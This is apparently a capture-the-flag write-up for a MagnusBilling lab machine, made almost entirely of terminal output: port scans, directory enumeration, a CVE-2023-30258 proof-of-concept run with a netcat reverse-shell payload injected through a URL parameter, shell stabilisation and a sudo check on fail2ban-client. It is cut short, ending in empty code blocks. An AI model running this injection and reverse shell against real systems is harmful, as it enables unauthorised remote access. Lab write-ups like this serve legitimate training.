
![2025-05-18_11-17](https://github.com/user-attachments/assets/9b88c7c6-bd1b-49ac-b2dc-0056c1579003)

<pre><code>PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukT/TLi8Po4V6OZVI6yhgSlTaANGLErWG2Hqz9UOxX3XXMFvRe0uivnYlcvBwvSe09IcHjC6qczRgRjdqQOxF2XHUIFBgPjNOR3mb1kfWg5jKAGun6+J9atS8z+5d6CZuv0YWH6jGJTQ1YS9vGNuFvE3coJKSBYtNbpJgBApX67tCQ4YKenrG/AQddi3zZz3mMHN6QldivMC+NCFp+PozjjoJgD4WULCElDwW4IgWjq64bL3Y/+Ii/PnPfLufZwaJNy67TjKv1KKzW0ag2UxqgTjc85feWAxvdWKVoX5FIhCrYwi6Q23BpTDqLSXoJ3irVCdVAqHfyqR72emcEgoWaxseXn2R68SptxxrUcpoMYUXtO1/0MZszBJ5tv3FBfY3NmCeGNwA98JXnJEb+3A1FU/LLN+Ah/Rl40NhrYGRqJcvz/UPreE73G/wjY8LAUnvamR/ybAPDkO+OP47OjPnQwwbmAW6g6BInnx9Ls5XBwULmn0ubMPi6dNWtQDZ0/U=
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBVI/7v4DHnwY/FkhLBQ71076mt5xG/9agRtb+vldezX9vOC2UgKnU6N+ySrhLEx2snCFNJGG0dukytLDxxKIcw=
|   256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII6ogE6DWtLYKAJo+wx+orTODOdYM23iJgDGE2l79ZBN
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.98.226/mbilling/
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<br><br>

![2025-05-18_11-28](https://github.com/user-attachments/assets/1c0de70b-a8a4-4c2e-a977-76af80def100)
<br><br>

<pre><code>===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.102.9/mbilling/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 30s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 320] [--> http://10.10.102.9/mbilling/assets/]
/resources            (Status: 301) [Size: 323] [--> http://10.10.102.9/mbilling/resources/]
/archive              (Status: 301) [Size: 321] [--> http://10.10.102.9/mbilling/archive/]
/lib                  (Status: 301) [Size: 317] [--> http://10.10.102.9/mbilling/lib/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.102.9/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 276]</code></pre>
<br><br>


<pre><code>https://nvd.nist.gov/vuln/detail/CVE-2023-30258</code></pre>
<br><br>

<pre><code>https://github.com/n00o00b/CVE-2023-30258-RCE-POC</code></pre>
<br><br>

<pre><code>python poc.py -u http://{target-ip}/mbilling --cmd "nc -c sh {your-ip} {port}"</code></pre>
<br><br>

<pre><code>python poc.py -u http://10.10.174.135/mbilling --cmd "nc -c sh 92.8.1.160 1234"</code></pre>
<br><br>

<pre><code>maxi@maxi-notebook ~ [1]> nc -nlvp 1234</code></pre>
<br><br>

<pre><code>maxi@maxi-notebook ~/C/t/e/b/scripts> python poc.py -u http://10.10.102.9/mbilling --cmd "nc -c sh 10.9.1.162 1234"
Target URL: http://10.10.102.9/mbilling
Executing command: nc -c sh 10.9.1.162 1234
http://10.10.102.9/mbilling/lib/icepay/icepay.php?democ=;nc%20-c%20sh%2010.9.1.162%201234;sleep 2;</code></pre>
<br><br>

<pre><code>maxi@maxi-notebook ~ [1]> nc -nlvp 1234
Connection from 10.10.84.12:49316
whoami
asterisk</code></pre>
<br><br>

<pre><code>python3 -c 'import pty;pty.spawn("/bin/bash");'
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
export TERM=xterm
asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ^Zfish: Job 1, 'nc -nlvp 1234' has stopped
maxi@maxi-notebook ~ [1]> stty raw -echo; fg
Send job 1 (nc -nlvp 1234) to foreground
ls                                      
ls
icepay-cc.php		icepay-ideal.php	icepay-phone.php  null
icepay-ddebit.php	icepay-mistercash.php	icepay-sms.php
icepay-directebank.php	icepay-paypal.php	icepay-wire.php
icepay-giropay.php	icepay-paysafecard.php	icepay.php
asterisk@Billing:/var/www/html/mbilling/lib/icepay$                </code></pre>
<br><br>

<pre><code>asterisk@Billing:/home/magnus$ls
ls
Desktop    Downloads  Pictures	Templates  user.txt
Documents  Music      Public	Videos</code></pre>
<br><br>

<pre><code>asterisk@Billing:/home/magnus$ sudo -l
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client</code></pre>
<br><br>

<pre><code>asterisk@Billing:/home/magnus$ sudo -l
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client</code></pre>
<br><br>

<pre><code># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Fail2Ban; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""
Fail2Ban reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

This tools starts/stops fail2ban server or does client/server communication,
to change/read parameters of the server or jails.

"""

__author__ = "Fail2Ban Developers"
__copyright__ = "Copyright (c) 2004-2008 Cyril Jaquier, 2012-2014 Yaroslav Halchenko, 2014-2016 Serg G. Brester"
__license__ = "GPL"

from fail2ban.client.fail2banclient import exec_command_line, sys

if __name__ == "__main__":
	exec_command_line(sys.argv)</code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

<pre><code></code></pre>
<br><br>

